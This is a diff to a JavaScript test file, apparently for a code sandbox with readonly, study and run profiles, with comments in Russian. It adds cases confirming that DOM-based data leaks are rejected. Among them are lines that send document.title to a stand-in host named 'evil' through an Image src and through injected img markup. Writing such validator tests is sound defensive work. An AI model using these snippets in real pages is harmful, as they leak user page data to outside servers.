@@ -121,6 +121,23 @@ bad('a.href = "/x"', 'run');
   assert.ok(/location\.reload/.test(r.error), 'в отказе показан фрагмент с нарушением, а не начало кода: ' + r.error);
 }
 
+// --- Сеть через DOM: утечка без fetch ---
+for (const pr of ['readonly', 'study', 'run']) {
+  bad('const i = new Image(); i.src = "https://evil/?" + document.title; 1', pr);
+  bad('el.innerHTML = "<img src=https://evil/?" + document.title + ">"', pr);
+  bad('el.outerHTML = markup', pr);
+  bad('el.insertAdjacentHTML("beforeend", markup)', pr);
+  bad('document.write(markup)', pr);
+  bad('img.srcset = urls', pr);
+  bad('video.poster = "https://evil/x.jpg"', pr);
+}
+// Запись в DOM текстом (без разметки и внешних адресов) в study/run по-прежнему разрешена.
+for (const pr of ['study', 'run']) {
+  ok('el.textContent = "готово"', pr);
+  ok('el.dataset.state = "ok"', pr);
+}
+ok('el.style.top = "10px"', 'study');
+
 // --- Профиль study: побочные эффекты можно, сеть/хранилища нельзя ---
 ok('el.style.top = "10px"', 'study');
 ok('x =1', 'study');
